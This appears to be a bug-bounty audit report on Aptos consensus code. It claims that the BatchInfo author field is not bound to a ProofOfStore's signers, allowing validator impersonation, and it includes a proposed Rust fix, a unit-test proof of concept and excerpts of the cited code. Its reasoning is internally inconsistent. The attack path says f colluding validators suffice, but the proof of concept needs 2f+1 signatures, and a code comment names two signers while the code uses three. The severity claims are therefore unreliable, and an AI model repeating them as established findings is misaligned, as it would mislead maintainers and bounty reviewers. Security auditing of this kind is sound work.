# Audit Report

## Title
BatchInfoExt Author Field Not Cryptographically Verified - Enables Validator Impersonation

## Summary
The `author()` and `batch_id()` methods in `BatchInfoExt` return unverified field values from the underlying `BatchInfo` struct. The `ProofOfStore` verification process validates aggregate signatures but never enforces that the `author` field matches any of the actual signers, enabling Byzantine validators to create batches with false author attribution.

## Finding Description

The vulnerability exists in the quorum store's proof-of-store verification logic. When a `ProofOfStore<BatchInfoExt>` is created and verified, the system validates:

1. The aggregate signature is cryptographically valid [1](#0-0) 

2. The signers have sufficient voting power [2](#0-1) 

However, the `author` field in `BatchInfo` is never validated against the actual signers. The field is simply a struct member that can be set to any value [3](#0-2) , and the `author()` method returns it directly without verification [4](#0-3)  and [5](#0-4) .

During signature aggregation, the system tracks whether the declared author voted [6](#0-5)  but **does not enforce** that the author must be one of the signers.

**Attack Path:**

1. Byzantine validator V1 creates a `BatchInfo` with `author = VictimValidator` 
2. V1 collects signatures from f colluding validators (where f < n/3)
3. V1 creates a `ProofOfStore` with valid aggregate signature
4. The proof passes verification in `UnverifiedEvent::verify()` [7](#0-6) 
5. The unverified author value is used in `BatchKey::from_info()` [8](#0-7) 
6. The batch is indexed under the false author and used for critical decisions [9](#0-8) 

## Impact Explanation

This is a **High Severity** vulnerability that violates consensus-level security guarantees:

1. **Protocol Violation**: Breaks the fundamental authenticity invariant that batches are attributable to their true creators
2. **Accountability Bypass**: Byzantine validators can hide behind false author identities, making forensic analysis and incident response ineffective
3. **Fairness Manipulation**: The `author_to_batches` data structure is used for per-validator fairness and ordering [10](#0-9) , which can be poisoned
4. **Metric Corruption**: Local vs remote batch classification [11](#0-10)  affects back pressure and resource management
5. **Reputation Damage**: Malicious batches are attributed to innocent validators, undermining trust

This meets the "Significant protocol violations" criterion for High Severity under the Aptos bug bounty program.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack requires:
- At least one Byzantine validator to craft the malicious `BatchInfo`
- f colluding validators to sign (where n = 3f+1, so f < n/3)

Given that the Byzantine fault tolerance model explicitly accounts for up to f malicious validators, this attack is **within the threat model**. The code incorrectly assumes that the `author` field is trustworthy when it should be cryptographically bound to the signers.

The vulnerability is **always exploitable** when Byzantine validators exist in the network, making it a persistent security weakness rather than a race condition or edge case.

## Recommendation

Add validation to enforce that the `author` field in `BatchInfo` must match one of the signers in the `ProofOfStore`. Modify the verification logic:

**In `consensus/consensus-types/src/proof_of_store.rs`**, enhance `ProofOfStore::verify()`:

```rust
pub fn verify(&self, validator: &ValidatorVerifier, cache: &ProofCache) -> anyhow::Result<()> {
    let batch_info_ext: BatchInfoExt = self.info.clone().into();
    if let Some(signature) = cache.get(&batch_info_ext) {
        if signature == self.multi_signature {
            return Ok(());
        }
    }
    let result = validator
        .verify_multi_signatures(&self.info, &self.multi_signature)
        .context(format!(
            "Failed to verify ProofOfStore for batch: {:?}",
            self.info
        ));
    
    // NEW: Verify that the declared author is one of the signers
    if result.is_ok() {
        let signers = self.multi_signature.get_signers_addresses(
            &validator.get_ordered_account_addresses()
        );
        ensure!(
            signers.contains(&self.info.author()),
            "Batch author {} is not one of the signers",
            self.info.author()
        );
        cache.insert(batch_info_ext, self.multi_signature.clone());
    }
    result
}
```

Alternatively, remove the `author` field entirely and derive it from the signers (e.g., the first signer or the validator who initiated the batch creation).

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
// File: consensus/src/quorum_store/tests/author_impersonation_test.rs

#[cfg(test)]
mod tests {
    use super::*;
    use aptos_consensus_types::proof_of_store::*;
    use aptos_types::aggregate_signature::AggregateSignature;
    
    #[test]
    fn test_author_impersonation_vulnerability() {
        // Setup: Create validator set with 4 validators
        let (validator_signers, validator_verifier) = 
            aptos_types::validator_verifier::ValidatorVerifier::new_single(4);
        
        // Attacker (validator 0) creates a batch claiming to be from victim (validator 3)
        let victim_peer_id = validator_signers[3].author();
        let malicious_batch_info = BatchInfoExt::new_v1(
            victim_peer_id,  // FALSE AUTHOR - claiming to be validator 3
            BatchId::new(1),
            0,  // epoch
            100000,  // expiration
            HashValue::random(),
            10,  // num_txns
            1000,  // num_bytes
            0,  // gas_bucket_start
        );
        
        // Attacker collects signatures from validator 0 and 1 (2f+1 = 3 needed for 4 validators)
        let sig0 = validator_signers[0].sign(&malicious_batch_info).unwrap();
        let sig1 = validator_signers[1].sign(&malicious_batch_info).unwrap();
        let sig2 = validator_signers[2].sign(&malicious_batch_info).unwrap();
        
        // Create aggregate signature (validator 3, the victim, DID NOT sign)
        let mut agg_sig = AggregateSignature::empty();
        agg_sig.add_signature(0, sig0);
        agg_sig.add_signature(1, sig1);
        agg_sig.add_signature(2, sig2);
        
        // Create ProofOfStore
        let malicious_proof = ProofOfStore::new(malicious_batch_info.clone(), agg_sig);
        
        // VULNERABILITY: This verification PASSES even though the author (validator 3)
        // did not sign the batch!
        let cache = ProofCache::new(100);
        assert!(malicious_proof.verify(&validator_verifier, &cache).is_ok());
        
        // The system will now attribute this batch to validator 3 (the victim)
        assert_eq!(malicious_proof.author(), victim_peer_id);
        
        // Demonstrate impact: BatchKey uses the unverified author
        let batch_key = BatchKey::from_info(malicious_proof.info());
        assert_eq!(batch_key.author, victim_peer_id);
        // This batch will be indexed under victim's name in author_to_batches
    }
}
```

## Notes

This vulnerability fundamentally breaks the authenticity guarantee of the quorum store protocol. While it requires Byzantine validators to exploit, this is explicitly within the system's threat model (< 1/3 Byzantine nodes). The lack of cryptographic binding between the `author` field and the actual signers represents a critical gap in the verification logic that undermines accountability, fairness, and trust in the consensus system.

### Citations

**File:** consensus/consensus-types/src/proof_of_store.rs (L49-58)
```rust
pub struct BatchInfo {
    author: PeerId,
    batch_id: BatchId,
    epoch: u64,
    expiration: u64,
    digest: HashValue,
    num_txns: u64,
    num_bytes: u64,
    gas_bucket_start: u64,
}
```

**File:** consensus/consensus-types/src/proof_of_store.rs (L87-93)
```rust
    pub fn author(&self) -> PeerId {
        self.author
    }

    pub fn batch_id(&self) -> BatchId {
        self.batch_id
    }
```

**File:** consensus/consensus-types/src/proof_of_store.rs (L300-302)
```rust
    fn author(&self) -> PeerId {
        self.info().author()
    }
```

**File:** consensus/consensus-types/src/proof_of_store.rs (L635-652)
```rust
    pub fn verify(&self, validator: &ValidatorVerifier, cache: &ProofCache) -> anyhow::Result<()> {
        let batch_info_ext: BatchInfoExt = self.info.clone().into();
        if let Some(signature) = cache.get(&batch_info_ext) {
            if signature == self.multi_signature {
                return Ok(());
            }
        }
        let result = validator
            .verify_multi_signatures(&self.info, &self.multi_signature)
            .context(format!(
                "Failed to verify ProofOfStore for batch: {:?}",
                self.info
            ));
        if result.is_ok() {
            cache.insert(batch_info_ext, self.multi_signature.clone());
        }
        result
    }
```

**File:** types/src/validator_verifier.rs (L345-386)
```rust
    pub fn verify_multi_signatures<T: CryptoHash + Serialize>(
        &self,
        message: &T,
        multi_signature: &AggregateSignature,
    ) -> std::result::Result<(), VerifyError> {
        // Verify the number of signature is not greater than expected.
        Self::check_num_of_voters(self.len() as u16, multi_signature.get_signers_bitvec())?;
        let mut pub_keys = vec![];
        let mut authors = vec![];
        for index in multi_signature.get_signers_bitvec().iter_ones() {
            let validator = self
                .validator_infos
                .get(index)
                .ok_or(VerifyError::UnknownAuthor)?;
            authors.push(validator.address);
            pub_keys.push(validator.public_key());
        }
        // Verify the quorum voting power of the authors
        self.check_voting_power(authors.iter(), true)?;
        #[cfg(any(test, feature = "fuzzing"))]
        {
            if self.quorum_voting_power == 0 {
                // This should happen only in case of tests.
                // TODO(skedia): Clean up the test behaviors to not rely on empty signature
                // verification
                return Ok(());
            }
        }
        // Verify empty multi signature
        let multi_sig = multi_signature
            .sig()
            .as_ref()
            .ok_or(VerifyError::EmptySignature)?;
        // Verify the optimistically aggregated signature.
        let aggregated_key =
            PublicKey::aggregate(pub_keys).map_err(|_| VerifyError::FailedToAggregatePubKey)?;

        multi_sig
            .verify(message, &aggregated_key)
            .map_err(|_| VerifyError::InvalidMultiSignature)?;
        Ok(())
    }
```

**File:** consensus/src/quorum_store/proof_coordinator.rs (L164-166)
```rust
                if signed_batch_info.signer() == self.signature_aggregator.data().author() {
                    self.self_voted = true;
                }
```

**File:** consensus/src/round_manager.rs (L221-228)
```rust
            UnverifiedEvent::ProofOfStoreMsgV2(p) => {
                if !self_message {
                    p.verify(max_num_batches, validator, proof_cache)?;
                    counters::VERIFY_MSG
                        .with_label_values(&["proof_of_store_v2"])
                        .observe(start_time.elapsed().as_secs_f64());
                }
                VerifiedEvent::ProofOfStoreMsg(p)
```

**File:** consensus/src/quorum_store/utils.rs (L157-162)
```rust
    pub fn from_info(info: &BatchInfoExt) -> Self {
        Self {
            author: info.author(),
            batch_id: info.batch_id(),
        }
    }
```

**File:** consensus/src/quorum_store/batch_proof_queue.rs (L190-250)
```rust
        let author = proof.author();
        let bucket = proof.gas_bucket_start();
        let num_txns = proof.num_txns();
        let expiration = proof.expiration();

        let batch_sort_key = BatchSortKey::from_info(proof.info());
        let batches_for_author = self.author_to_batches.entry(author).or_default();
        batches_for_author.insert(batch_sort_key.clone(), proof.info().clone());

        // Check if a batch with a higher batch Id (reverse sorted) exists
        if let Some((prev_batch_key, _)) = batches_for_author
            .range((Bound::Unbounded, Bound::Excluded(batch_sort_key.clone())))
            .next_back()
        {
            if prev_batch_key.gas_bucket_start() == batch_sort_key.gas_bucket_start() {
                counters::PROOF_MANAGER_OUT_OF_ORDER_PROOF_INSERTION
                    .with_label_values(&[author.short_str().as_str()])
                    .inc();
            }
        }

        self.expirations.add_item(batch_sort_key, expiration);

        // If we are here, then proof is added for the first time. Otherwise, we will
        // return early. We only count when proof is added for the first time and txn
        // summary exists.
        if let Some(txn_summaries) = self
            .items
            .get(&batch_key)
            .and_then(|item| item.txn_summaries.as_ref())
        {
            for txn_summary in txn_summaries {
                *self
                    .txn_summary_num_occurrences
                    .entry(*txn_summary)
                    .or_insert(0) += 1;
            }
        }

        match self.items.entry(batch_key) {
            Entry::Occupied(mut entry) => {
                let item = entry.get_mut();
                item.proof = Some(proof);
                item.proof_insertion_time = Some(Instant::now());
            },
            Entry::Vacant(entry) => {
                entry.insert(QueueItem {
                    info: proof.info().clone(),
                    proof: Some(proof),
                    proof_insertion_time: Some(Instant::now()),
                    txn_summaries: None,
                });
            },
        }

        if author == self.my_peer_id {
            counters::inc_local_pos_count(bucket);
        } else {
            counters::inc_remote_pos_count(bucket);
        }
        self.inc_remaining_proofs(&author, num_txns);
```
